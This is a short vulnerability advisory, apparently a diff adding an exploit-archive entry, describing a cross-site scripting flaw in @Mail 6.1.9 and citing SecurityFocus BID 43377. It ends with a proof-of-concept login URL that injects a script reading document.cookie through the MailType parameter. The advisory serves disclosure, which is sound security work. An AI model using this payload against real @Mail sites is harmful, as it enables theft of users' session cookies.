@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/43377/info
+
+@Mail is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage this issue to execute arbitrary JavaScript code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+@Mail 6.1.9 is vulnerable; prior versions may also be affected.
+
+http://www.example.com/index.php/mail/auth/processlogin?emailName=&lt;emailName&gt;&amp;emailDomain=&lt;emailDomain&gt;&amp;cssStyle=original&amp;email=&lt;email&gt;password=&lt;password&gt;&amp;requestedServer=&amp;MailType=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
